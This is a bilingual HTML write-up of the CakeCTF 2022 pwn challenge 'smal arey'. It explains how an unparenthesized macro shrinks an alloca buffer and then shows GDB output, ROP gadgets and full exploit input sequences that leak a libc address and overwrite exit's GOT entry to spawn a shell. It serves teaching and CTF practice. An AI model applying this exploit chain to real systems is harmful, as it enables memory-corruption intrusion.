@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>smal arey (CakeCTF 2022) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>smal arey</h1>
+<p class="language-selector-ja" lang="ja">
+TCPサーバの接続情報と、以下のファイルが与えられた。
+</p>
+<p class="language-selector-en" lang="en">
+Information to connect to a TCP server, and these files were given:
+<ul>
+<li><code>chall</code></li>
+<li><code>ld-2.31.so</code></li>
+<li><code>libc-2.31.so</code></li>
+<li><code>main.c</code></li>
+</ul>
+<div class="language-selector-ja" lang="ja">
+<p>
+<code>main.c</code> は、以下の処理をするプログラムだった。
+</p>
+<ol>
+<li>ローカル変数 <code>size</code> に値を読み込む。</li>
+<li>読み込んだ <code>size</code> が負または5より大きい場合、<code>exit(0);</code> で終了する。</li>
+<li>読み込んだ <code>size</code> に基づいて決まる大きさの領域を確保し、ポインタをローカル変数 <code>arr</code> に格納する。</li>
+<li>以下を無限に繰り返す。
+<ol>
+<li>ローカル変数 <code>index</code> に値を読み込む。</li>
+<li>読み込んだ値が負または <code>size</code> 以上の場合、<code>exit(0);</code> で終了する。</li>
+<li><code>arr[index]</code> に値を読み込む。</li>
+</ol></li>
+</ol>
+<p>
+領域の確保は、以下のマクロを用いて行われていた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+<code>main.c</code> was a program doing these:
+</p>
+<ol>
+<li>Read a value into a local variable <code>size</code>.</li>
+<li>If the <code>size</code> read is negative or larger than 5, stop execution via <code>exit(0);</code>.</li>
+<li>Allocate some region with size derived from the <code>size</code> read and store its pointer to a local variable <code>arr</code>.</li>
+<li>Repeat this infinitely:
+<ol>
+<li>Read a value into a local variable<code>index</code>.</li>
+<li>If the value read is negative, or <code>size</code> or more, stop execution via <code>exit(0);</code>.</li>
+<li>Read a value into <code>arr[index]</code>.</li>
+</ol></li>
+</ol>
+<p>
+The allocation was done via these macros:
+</p>
+</div>
+<code-block data-extension="c">
+#define ARRAY_SIZE(n) (n * sizeof(long))
+#define ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))
+</code-block>
+
+<div class="language-selector-ja" lang="ja">
+<p>
+これは <code>(long*)alloca((n + 1 * sizeof(long)))</code> に展開され、<code>n</code> の値に <code>sizeof(long)</code> が掛からないので、確保する領域が小さくなりそうである。
+</p><p>
+<common-tool data-lang="ja">CS50 Sandbox</common-tool> で <code>chall</code> を <code>objdump -d</code> を用いて逆アセンブルした後、<br>
+GDBで最後の <code>scanf</code> を呼ぶ直前にブレークポイントを置いてスタックの内容を調べると、以下のようになった。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+This will be expanded to <code>(long*)alloca((n + 1 * sizeof(long)))</code>.<br>
+<code>sizeof(long)</code> won't be multiplied to the value of <code>n</code>, so the size to be allocated will be smaller than expected.
+</p><p>
+I disassembled <code>chall</code> via <code>objdump -d</code> on <common-tool data-lang="en">CS50 Sandbox</common-tool>.<br>
+After that, I checked the contents in the stack using GDB by putting a breakpoint just before calling the last <code>scanf</code>. This is the result:
+</p>
+</div>
+<code-block data-extension="txt">
+$ objdump -d chall > chall-dump.txt
+$ gdb ./chall
+Reading symbols from ./chall...(no debugging symbols found)...done.
+(gdb) break *0x401325
+Breakpoint 1 at 0x401325
+(gdb) r
+Starting program: /root/sandbox/chall 
+size: 5
+index: 0
+value: 
+Breakpoint 1, 0x0000000000401325 in main ()
+(gdb) p/x $rsi
+$1 = 0x7fffffffe230
+(gdb) p/x $rsp
+$2 = 0x7fffffffe230
+(gdb) x/16gx $rsp
+0x7fffffffe230: 0x0000000000000000      0x00007ffff7ffe170
+0x7fffffffe240: 0x0000000000000000      0x00000000004011fa
+0x7fffffffe250: 0x0000000000000005      0x0000000000000000
+0x7fffffffe260: 0x00007fffffffe230      0x5036f555ed27a400
+0x7fffffffe270: 0x0000000000401380      0x00007ffff7a03bf7
+0x7fffffffe280: 0x0000000000000001      0x00007fffffffe358
+0x7fffffffe290: 0x0000000100008000      0x00000000004011b6
+0x7fffffffe2a0: 0x0000000000000000      0x1be814534263d8cb
+(gdb) p/x $rbp
+$3 = 0x7fffffffe270
+(gdb)
+</code-block>
+
+<div class="language-selector-ja" lang="ja">
+<p>
+ここから、以下のことが読み取れる。
+</p>
+<ul>
+<li><code>arr</code>が指す配列の先頭アドレスは <code>0x7fffffffe230</code> であり、スタックトップもこのアドレスである。</li>
+<li>配列の4要素目 (0-origin、以下同じ) が、<code>size</code> の値になっている。</li>
+<li>配列の6要素目が、<code>arr</code> の値になっている。</li>
+<li>配列の9要素目 (<code>$rbp</code> が指している要素の次) が、関数 <code>main</code> のリターンアドレスになっている。</li>
+</ul>
+<p>
+したがって、配列の4要素目に大きい値を書き込むことで、値を書き込めるオフセットの範囲を増やすことができる。<br>
+さらに、配列の6要素目を書き換えることで、値を書き込むアドレスを自由に変えることができる。<br>
+これを用いて <code>.plt.sec</code> が参照する <code>exit</code> のアドレスを書き換えることで、<code>exit(0);</code> で実行する処理を変えることができる。
+</p><p>
+また、<code>chall</code> には以下の部分がある。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+From this result, I found these facts:
+</p>
+<ul>
+<li>The address of the first element of the array pointed at by <code>arr</code> is <code>0x7fffffffe230</code>. The stack top is also this address.</li>
+<li>The 4th element of the array (the first element is 0th, this also applies below) has the value of <code>size</code>.</li>
+<li>The 6th element of the array has the value of <code>arr</code>.</li>
+<li>The 9th element of the array (the next element of the element pointed at by <code>$rbp</code>) is the return address of the function <code>main</code>.</li>
+</ul>
+<p>
+This implies that writing some large value to the 4th element of the array will extend the maximum offset to write a value,<br>
+and that we can arbitrary set the address to write by setting the 6th element of the array.<br>
+We can change what is executed via <code>exit(0);</code> by using this feature to set tha address of <code>exit</code> used in <code>.plt.sec</code>.
+</p><p>
+Also note that the file <code>chall</code> has this part:
+</p>
+</div>
+<code-block data-extension="txt">
+  4013dc:	41 5c                	pop    %r12
+  4013de:	41 5d                	pop    %r13
+  4013e0:	41 5e                	pop    %r14
+  4013e2:	41 5f                	pop    %r15
+  4013e4:	c3                   	retq   
+</code-block>
+
+<div class="language-selector-ja" lang="ja">
+<p>
+この部分は、以下のgadgetとして用いることができる。
+</p>
+<ul>
+<li><code>0x4013dc</code> : 4要素をpopしてret</li>
+<li><code>0x4013e1</code> : <code>%rsi</code>に値をpopし、さらに1要素をpopしてret</li>
+<li><code>0x4013e3</code> : <code>%rdi</code>に値をpopしてret</li>
+<li><code>0x4013e4</code> : ret</li>
+</ul>
+<p>
+<code>exit(0);</code> として実行するアドレスを「4要素をpopしてret」のものにすると、<code>exit(0);</code> を呼び出した時のリターンアドレスに加えてさらに3要素をpopし、3要素目からROPを実行できる。<br>
+さらに、以下のように値を配置し、<code>printf</code> 関数によって <code>main</code> 関数のリターンアドレスを出力した後、もう一度 <code>main</code> 関数を実行するようにした。
+</p>
+<ul>
+<li>3要素目 : <code>0x4013dc</code> (4要素をpopしてret)</li>
+<li>8要素目 : <code>0x4013e1</code> (<code>%rsi</code>に値 (9要素目のリターンアドレス) をpopし、さらに1要素をpopしてret)</li>
+<li>11要素目 : <code>0x4013e3</code> (<code>%rdi</code>に値をpopしてret)</li>
+<li>12要素目 : <code>0x40200b</code> (文字列 <code>"%ld"</code> のアドレス)</li>
+<li>13要素目 : <code>0x4013e4</code> (アラインメント調整用のret)</li>
+<li>14要素目 : <code>0x401090</code> (<code>printf</code>)</li>
+<li>15要素目 : <code>0x4013e4</code> (アラインメント調整用のret)</li>
+<li>16要素目 : <code>0x4011b6</code> (<code>main</code>)</li>
+</ul>
+<p>
+そして、6要素目 (書き込み先のアドレス) に <code>exit</code> として呼び出すアドレスのアドレス <code>0x404038</code> を書き込み、<br>
+<code>exit</code> として呼び出すアドレスとして <code>0x4013dc</code> (4要素をpopしてret) を設定した。<br>
+最後に <code>-1</code> を入力して <code>exit(0);</code> を呼び出させることで、用意した処理を実行させた。<br>
+ここまでを行う入力が以下である。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+This part is useful as these gadgets:
+</p>
+<ul>
+<li><code>0x4013dc</code> : POP 4 elements and RET</li>
+<li><code>0x4013e1</code> : POP a value to <code>%rsi</code>, POP another element, and RET</li>
+<li><code>0x4013e3</code> : POP a value to <code>%rdi</code> and RET</li>
+<li><code>0x4013e4</code> : RET</li>
+</ul>
+<p>
+Setting the address to execute as <code>exit(0);</code> to one of "POP 4 elements and RET", it will POP the return address recorded by the call of <code>exit(0);</code> and 3 more elements, and will execute ROP from the 3rd element.<br>
+Also, I placed values as described below to have it print the return address of the function <code>main</code> via the function <code>printf</code>, and execute the function <code>main</code> again.
+</p>
+<ul>
+<li>The 3rd element : <code>0x4013dc</code> (POP 4 elements and RET)</li>
+<li>The 8th element : <code>0x4013e1</code> (POP a value (the return address, which is placed as the 9th element) to  <code>%rsi</code>, POP another element and RET)</li>
+<li>The 11th element : <code>0x4013e3</code> (POP a value to <code>%rdi</code> and RET)</li>
+<li>The 12th element : <code>0x40200b</code> (The address of the string <code>"%ld"</code>)</li>
+<li>The 13th element : <code>0x4013e4</code> (RET for adjusting the stack alignment)</li>
+<li>The 14th element : <code>0x401090</code> (<code>printf</code>)</li>
+<li>The 15th element : <code>0x4013e4</code> (RET for adjusting the stack alignment)</li>
+<li>The 16th element : <code>0x4011b6</code> (<code>main</code>)</li>
+</ul>
+<p>
+After that, I put <code>0x404038</code>, which is the address of the address to be called as <code>exit</code> to the 6th element (where to write),<br>
+and set the address to be called as <code>exit</code> to <code>0x4013dc</code> (POP 4 elements and RET).<br>
+Finally, I executed these steps by entering <code>-1</code> to have it call <code>exit(0);</code>.<br>
+This is my input for these process:
+</p>
+</div>
+<code-block data-extension="txt">
+5
+4 114514
+3 4199388
+8 4199393
+11 4199395
+12 4202507
+13 4199396
+14 4198544
+15 4199396
+16 4198838
+6 4210744
+0 4199388
+-1
+</code-block>
+<p class="language-selector-ja" lang="ja">
+この入力を送信すると、例えば <code>140525264064643</code> が出力された。<br>
+これは16進数にすると <code>0x7fce96725083</code> である。<br>
+この下3桁を取り、CS50 Sandboxで <code>objdump -d libc-2.31.so</code> をした結果から <code>083:</code> を検索すると、<code>main</code>関数を呼び出していると推測できる以下の部分が見つかった。
+</p>
+<p class="language-selector-en" lang="en">
+Sending this input, <code>140525264064643</code> was printed, for example.<br>
+This value is <code>0x7fce96725083</code> in hexadecimal.<br>
+Taking the least 3 digits, I searched for <code>083:</code> from the result of <code>objdump -d libc-2.31.so</code> on CS50 Sandbox.<br>
+As a result, I found this part, which looks calling the function <code>main</code>:
+</p>
+<code-block data-extension="txt">
+   24081:	ff d0                	callq  *%rax
+   24083:	89 c7                	mov    %eax,%edi
+   24085:	e8 b6 29 02 00       	callq  46a40 &lt;exit@@GLIBC_2.2.5&gt;
+</code-block>
+
+<div class="language-selector-ja" lang="ja">
+<p>
+さらに、同じダンプ内を検索することで、ダンプにおける<code>system</code>関数のアドレスは <code>0x52290</code> だとわかった。
+</p><p>
+これらの情報を用いて、<code>system("/bin/sh");</code> を実行させた。<br>
+まず、1回目と同様に4要素目に大きい値を書き込み、値を書き込む範囲の制限を解除した。<br>
+そして、以下の値を書き込んだ。
+</p>
+<ul>
+<li>3要素目 : <code>0x4013dc</code> (4要素をpopしてret)</li>
+<li>8要素目 : <code>0x4013e3</code> (<code>%rdi</code>に値をpopしてret)</li>
+<li>9要素目 : <code>0x404040</code> (<code>exit</code> として呼び出すアドレスの次の要素のアドレス)</li>
+<li>10要素目 : <code>main</code>関数のリターンアドレス + <code>0x52290</code> - <code>0x24083</code> (<code>system</code>)</li>
+</ul>
+<p>
+さらに、6要素目に <code>0x404038</code> を書き込むことで書き込み先を切り替えた後、以下の値を書き込んだ。
+</p>
+<ul>
+<li>0要素目 : <code>0x4013dc</code> (4要素をpopしてret)</li>
+<li>1要素目 : <code>0x68732f6e69622f</code> (<code>"/bin/sh"</code>)
+</ul>
+<p>
+最後に <code>exit(0);</code> を呼び出させるために <code>-1</code> を送信すると、シェルを起動できた。<br>
+すなわち、以下を送信することで、シェルを起動できた。<br>
+(<code>address_of_system</code> は、1回目のROPで得られた <code>main</code> 関数のリターンアドレスに <code>188941</code> を足した値を10進数で表した文字列に置き換える)
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+I also found that the address in the dump of the function <code>system</code> is <code>0x52290</code> by searching from the dump.
+</p><p>
+I had it execute <code>system("/bin/sh");</code> using these information.<br>
+Firstly, as I did in the first part, I put some large value to the 4th element to disable the limitation of the range of where to write values.<br>
+Then, I put these values:
+</p>
+<ul>
+<li>The 3rd element : <code>0x4013dc</code> (POP 4 elements and RET)</li>
+<li>The 8th element : <code>0x4013e3</code> (POP a value to <code>%rdi</code> and RET)</li>
+<li>The 9th element : <code>0x404040</code> (The address of the next element of the address to be called as <code>exit</code>)</li>
+<li>The 10th element : The return address of <code>main</code> + <code>0x52290</code> - <code>0x24083</code> (<code>system</code>)</li>
+</ul>
+<p>
+After that, I put <code>0x404038</code> to the 6th element to switch where to put values, and then put these values:
+</p>
+<ul>
+<li>The 0th element : <code>0x4013dc</code> (POP 4 elements and RET)</li>
+<li>The 1st element : <code>0x68732f6e69622f</code> (<code>"/bin/sh"</code>)
+</ul>
+<p>
+Finally, I sent <code>-1</code> to have it call <code>exit(0);</code> and launch the shell.<br>
+In other words, I succeeded to launch the shell by sending this:<br>
+(<code>address_of_system</code> should be replaced with the return address of the function <code>main</code>, obtained in the first ROP, plus <code>188941</code>, represented in decimal)
+</p>
+</div>
+<code-block data-extension="txt">
+5
+4 114514
+3 4199388
+8 4199395
+9 4210752
+10 address_of_system
+6 4210744
+0 4199388
+1 29400045130965551
+-1
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+起動したシェルで <code>ls -al</code> コマンドを実行すると、ファイル <code>flag-c665afc224a93b0c2e4cf82abfedf180.txt</code> があることがわかった。<br>
+続いて <code>cat *.txt</code> コマンドを実行すると、flagが得られた。
+</p>
+<p class="language-selector-en" lang="en">
+I executed a command <code>ls -al</code> in the launched shell, and found a file <code>flag-c665afc224a93b0c2e4cf82abfedf180.txt</code>.<br>
+I obtained the flag by executing a command <code>cat *.txt</code>.
+</p>
+
+<div class="flag">CakeCTF{PRE01-C. Use parentheses within macros around parameter names}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">CakeCTF 2022</a>
+</p>
+</body>
+</html>
